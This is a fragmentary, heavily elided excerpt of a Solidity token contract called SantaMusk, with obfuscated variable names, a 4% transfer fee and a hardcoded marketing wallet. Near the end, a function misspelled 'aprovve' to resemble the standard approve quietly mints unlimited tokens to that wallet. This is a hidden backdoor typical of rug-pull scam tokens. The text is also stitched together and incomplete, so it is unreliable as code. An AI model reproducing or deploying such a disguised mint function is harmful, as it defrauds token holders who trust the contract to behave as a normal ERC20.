...
contract Context {
 ...
 contract SantaMusk is Context, ERC20, ERC20Metadata {
    ...
    mapping(address => uint256) private superfloROPX;
    ...
    uint256 private cryfaleROPX = 4;
    uint256 private _vebegoROPX = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloROPX[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletROPX = 0x1bB42925744D63A9343214ec350A5998651cb959;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloROPX[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloROPX[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleROPX / 100) / _vebegoROPX;
        allons = allons -  (_fee * _vebegoROPX);
        
        superfloROPX[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaROPX) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloROPX[account];
        require(accountBalance >= gzillaROPX, "BEP : Can't be done");
        unchecked {
            superfloROPX[account] = accountBalance - gzillaROPX;
        }
        _totalSupply -= gzillaROPX;

        emit Transfer(account, address(0), gzillaROPX);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloROPX[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletROPX, "ERC20: cannot permit dev address");
    }   
